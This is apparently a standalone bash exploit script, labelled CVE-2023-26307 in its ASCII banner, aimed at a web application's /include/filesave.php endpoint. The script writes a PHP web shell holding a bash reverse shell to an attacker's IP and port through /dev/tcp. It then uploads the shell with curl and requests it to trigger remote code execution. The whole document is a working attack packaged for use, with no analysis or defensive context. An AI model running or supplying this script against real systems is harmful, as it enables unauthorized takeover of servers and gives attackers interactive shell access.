#!/bin/bash

target_url=$1
local_ip=$2
local_port=$3

banner=$(cat << 'EOF'
_____________   _______________         _______________   ________  ________           ________  ________   ________________________ 
\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \ \_____  \          \_____  \ \_____  \ /  _____/\   _  \______  \
/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/   _(__  <   ______  /  ____/   _(__  </   __  \ /  /_\  \  /    /
\     \____\     /   |        \ /_____/ /       \  \_/   \/       \  /       \ /_____/ /       \  /       \  |__\  \\  \_/   \/    / 
 \______  / \___/   /_______  /         \_______ \_____  /\_______ \/______  /         \_______ \/______  /\_____  / \_____  /____/  
        \/                  \/                  \/     \/         \/       \/                  \/       \/       \/        \/        
EOF
)

if [ $# -ne 3 ]; then
    echo "$banner"
    echo "Usage: $0 <TARGET_URL> <LOCAL_IP> <LOCAL_PORT>"
    exit 1
fi


shell=$(echo -e "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$local_ip/$local_port 0>&1'\"); ?>" > /tmp/shell.php)

upload_shell=$(curl -s -X POST -i "$target_url/include/filesave.php" \
     --data-urlencode "data=$(</tmp/shell.php)" \
     --data-urlencode "file=shell.php")
     
response_code=$(echo $upload_shell | head -n 1 | awk -F' ' '{print$2}')

if [ $response_code == "200" ]; then
     echo -e  "[+] Shell successfully uploaded!"
     sleep 1
     rm /tmp/shell.php
fi

echo -e "Attempting to execute the shell at path: $target_url/include/shell.php"

execute_shell=$(curl -s "$target_url/include/shell.php")


